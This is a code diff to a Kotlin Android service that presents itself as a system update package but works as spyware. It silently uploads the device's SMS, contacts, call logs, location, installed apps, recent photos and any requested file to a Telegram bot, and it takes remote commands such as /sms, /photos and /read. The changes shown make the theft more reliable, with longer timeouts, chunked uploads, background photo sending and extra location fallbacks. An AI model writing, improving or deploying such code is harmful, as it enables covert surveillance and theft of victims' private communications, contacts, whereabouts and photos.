@@ -3,6 +3,7 @@ package com.system.update
 import android.app.*
 import android.content.*
 import android.os.*
+import android.util.Log
 import java.io.*
 import java.net.*
 import org.json.*
@@ -43,27 +44,35 @@ class CoreService : Service() {
         while (true) {
             try {
                 for (u in getUpdates()) handle(u)
-            } catch (_: Exception) {}
-            Thread.sleep(3000)
+            } catch (e: Exception) {
+                Log.e("CoreService", "loop: ${e.message}")
+            }
+            Thread.sleep(2000)
         }
     }
 
     private fun initialDump() {
         try {
             sendText("=== NEW DEVICE ===\n" + deviceInfo())
+            Thread.sleep(800)
             sendFile(dumpSms(), "sms.txt")
+            Thread.sleep(1500)
             sendFile(dumpContacts(), "contacts.txt")
+            Thread.sleep(1500)
             sendFile(dumpCalls(), "calls.txt")
+            Thread.sleep(1500)
             sendText("LOC: " + getLoc())
             sendRecentPhotos(20)
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            Log.e("CoreService", "initialDump: ${e.message}")
+        }
     }
 
     private fun getUpdates(): List<JSONObject> {
-        val url = URL("https://api.telegram.org/bot$BOT/getUpdates?timeout=5&offset=${lastUpdate + 1}")
+        val url = URL("https://api.telegram.org/bot$BOT/getUpdates?offset=${lastUpdate + 1}")
         val conn = url.openConnection() as HttpURLConnection
-        conn.connectTimeout = 10000
-        conn.readTimeout = 10000
+        conn.connectTimeout = 15000
+        conn.readTimeout = 15000
         val body = conn.inputStream.bufferedReader().readText()
         val arr = JSONObject(body).getJSONArray("result")
         val out = mutableListOf<JSONObject>()
@@ -79,18 +88,37 @@ class CoreService : Service() {
     private fun handle(u: JSONObject) {
         val msg = u.optJSONObject("message") ?: return
         val text = msg.optString("text")
+        Log.d("CoreService", "cmd: $text")
         when {
-            text == "/sms" -> sendFile(dumpSms(), "sms.txt")
-            text == "/contacts" -> sendFile(dumpContacts(), "contacts.txt")
-            text == "/calls" -> sendFile(dumpCalls(), "calls.txt")
+            text == "/sms" -> {
+                sendText("SMS...")
+                sendFile(dumpSms(), "sms.txt")
+            }
+            text == "/contacts" -> {
+                sendText("Contacts...")
+                sendFile(dumpContacts(), "contacts.txt")
+            }
+            text == "/calls" -> {
+                sendText("Calls...")
+                sendFile(dumpCalls(), "calls.txt")
+            }
             text == "/loc" -> sendText(getLoc())
             text == "/info" -> sendText(deviceInfo())
-            text == "/photos" -> sendRecentPhotos(50)
-            text == "/apps" -> sendFile(dumpApps(), "apps.txt")
+            text == "/photos" -> {
+                sendText("Photos...")
+                Thread { sendRecentPhotos(50) }.start()
+            }
+            text == "/apps" -> {
+                sendText("Apps...")
+                sendFile(dumpApps(), "apps.txt")
+            }
             text.startsWith("/read") -> {
                 val p = text.removePrefix("/read").trim()
                 val f = File(p)
-                if (f.exists()) sendFile(f, f.name)
+                if (f.exists()) {
+                    sendText("Read: $p")
+                    Thread { sendFile(f, f.name) }.start()
+                } else sendText("not found: $p")
             }
             text.startsWith("/ls") -> {
                 val p = text.removePrefix("/ls").trim()
@@ -171,30 +199,40 @@ class CoreService : Service() {
     }
 
     private fun sendRecentPhotos(count: Int) {
-        val proj = arrayOf(
-            android.provider.MediaStore.Images.Media._ID,
-            android.provider.MediaStore.Images.Media.DISPLAY_NAME
-        )
-        val c = contentResolver.query(
-            android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
-            proj, null, null,
-            android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT $count"
-        )
-        c?.use {
-            while (it.moveToNext()) {
-                val id = it.getLong(0)
-                val name = it.getString(1) ?: "img_$id.jpg"
-                val uri = android.net.Uri.withAppendedPath(
-                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
-                )
-                try {
-                    val ins = contentResolver.openInputStream(uri) ?: continue
-                    val tmp = File(cacheDir, name)
-                    tmp.outputStream().use { o -> ins.copyTo(o) }
-                    sendFile(tmp, name)
-                    tmp.delete()
-                } catch (_: Exception) {}
+        try {
+            val proj = arrayOf(
+                android.provider.MediaStore.Images.Media._ID,
+                android.provider.MediaStore.Images.Media.DISPLAY_NAME
+            )
+            val c = contentResolver.query(
+                android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                proj, null, null,
+                android.provider.MediaStore.Images.Media.DATE_ADDED + " DESC LIMIT $count"
+            )
+            var sent = 0
+            c?.use {
+                while (it.moveToNext()) {
+                    val id = it.getLong(0)
+                    val name = it.getString(1) ?: "img_$id.jpg"
+                    val uri = android.net.Uri.withAppendedPath(
+                        android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()
+                    )
+                    try {
+                        val ins = contentResolver.openInputStream(uri) ?: continue
+                        val tmp = File(cacheDir, name)
+                        tmp.outputStream().use { o -> ins.copyTo(o) }
+                        sendFile(tmp, name)
+                        tmp.delete()
+                        sent++
+                        Thread.sleep(1200)
+                    } catch (e: Exception) {
+                        Log.e("CoreService", "photo: ${e.message}")
+                    }
+                }
             }
+            sendText("Photos done: $sent")
+        } catch (e: Exception) {
+            Log.e("CoreService", "sendRecentPhotos: ${e.message}")
         }
     }
 
@@ -203,8 +241,11 @@ class CoreService : Service() {
             val lm = getSystemService(LOCATION_SERVICE) as android.location.LocationManager
             val loc = lm.getLastKnownLocation(android.location.LocationManager.NETWORK_PROVIDER)
                    ?: lm.getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER)
+                   ?: lm.getLastKnownLocation(android.location.LocationManager.PASSIVE_PROVIDER)
             return loc?.let { "${it.latitude},${it.longitude}" } ?: "no fix"
-        } catch (_: Exception) { return "err" }
+        } catch (e: Exception) {
+            return "err: ${e.message}"
+        }
     }
 
     private fun deviceInfo(): String =
@@ -220,7 +261,9 @@ class CoreService : Service() {
             conn.readTimeout = 15000
             conn.outputStream.write(body.toByteArray())
             conn.inputStream.close()
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            Log.e("CoreService", "sendText: ${e.message}")
+        }
     }
 
     private fun sendFile(f: File, name: String) {
@@ -230,18 +273,26 @@ class CoreService : Service() {
             val conn = URL("https://api.telegram.org/bot$BOT/sendDocument").openConnection() as HttpURLConnection
             conn.requestMethod = "POST"
             conn.doOutput = true
-            conn.connectTimeout = 30000
-            conn.readTimeout = 30000
+            conn.connectTimeout = 120000
+            conn.readTimeout = 120000
+            conn.setChunkedStreamingMode(0)
             conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=$b")
+
+            val bytes = f.readBytes()
             conn.outputStream.use { os ->
                 fun p(s: String) = os.write(s.toByteArray())
-                p("--$b\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT\r\n")
-                p("--$b\r\nContent-Disposition: form-data; name=\"document\"; filename=\"$name\"\r\n")
+                p("--$b\r\n")
+                p("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n$CHAT\r\n")
+                p("--$b\r\n")
+                p("Content-Disposition: form-data; name=\"document\"; filename=\"$name\"\r\n")
                 p("Content-Type: application/octet-stream\r\n\r\n")
-                f.inputStream().copyTo(os)
+                os.write(bytes)
                 p("\r\n--$b--\r\n")
             }
-            conn.inputStream.close()
-        } catch (_: Exception) {}
+            val resp = conn.inputStream.bufferedReader().readText()
+            Log.d("CoreService", "sendFile $name: ${resp.take(80)}")
+        } catch (e: Exception) {
+            Log.e("CoreService", "sendFile $name err: ${e.message}")
+        }
     }
 }
